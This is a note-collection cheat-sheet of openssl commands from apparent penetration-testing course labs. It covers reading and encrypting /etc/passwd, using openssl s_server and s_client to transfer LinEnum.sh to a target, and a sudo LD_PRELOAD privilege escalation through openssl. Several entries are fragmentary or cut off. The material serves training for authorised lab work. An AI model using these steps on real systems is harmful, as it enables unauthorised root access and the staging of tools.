# Openssl

% openssl, crypto, cpts

## Openssl - Openssl - Openssl - Openssl - encryption
#cat/CODE #cpts
```
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

## Openssl - Openssl - Openssl - Openssl - decryption
#cat/CODE #cpts
```
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

## Openssl - Openssl - Openssl - Openssl - gtfobinshttpsgtfobinsgithubio
#cat/CODE #cpts
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

## Openssl - Openssl - Openssl - Openssl - gtfobinshttpsgtfobinsgithubio-2
#cat/CODE #cpts
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

```
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

## Openssl - Openssl - Openssl - Openssl - gtfobinshttpsgtfobinsgithubio-3
#cat/CODE #cpts
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.

```
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Openssl - Openssl - Openssl - Openssl - pwnbox---create-a-self-signed-certificate
#cat/CODE #cpts
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

## Openssl - Openssl - Openssl - Openssl - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra
#cat/CODE #cpts
```
shell-session
```

## Openssl - Openssl - Openssl - Openssl - what-command-can-the-htb-student-user-run-as-root
#cat/CODE #cpts
```
:~/shared_obj_hijack$ sudo -l
```

## Openssl - Openssl - Openssl - Openssl - what-command-can-the-htb-student-user-run-as-root-2
#cat/CODE #cpts
```
(root) NOPASSWD: /usr/bin/openssl
```

## Openssl - Openssl - Openssl - Openssl - escalate-privileges-using-ld_preload-technique-submit-the-contents-of-
#cat/CODE #cpts
```
:~$ sudo -l
```

## Openssl - Openssl - Openssl - Openssl - escalate-privileges-using-ld_preload-technique-submit-the-contents-of--2
#cat/CODE #cpts
Once compiled, students need to escalate privileges by running `openssl` and setting `root.so` to be loaded before any other library:

```
sudo LD_PRELOAD=./root.so /usr/bin/openssl
```

## Openssl - Openssl - Openssl - Openssl - connecting-via-freerdp
#cat/CODE #cpts
We can connect via command line using the command `xfreerdp /v:<target ip> /u:htb-student` and typing in the provided password when prompted. Most sections will provide credentials for the `htb-student` user, but some, d

```
xfreerdp /v:10.129.43.36 /u:htb-student
```

## Openssl - Openssl - Openssl - Openssl - escalate-privileges-on-the-target-host-and-submit-the-contents-of-the-
#cat/CODE #cpts
```
(ALL) NOPASSWD: /usr/bin/openssl
```

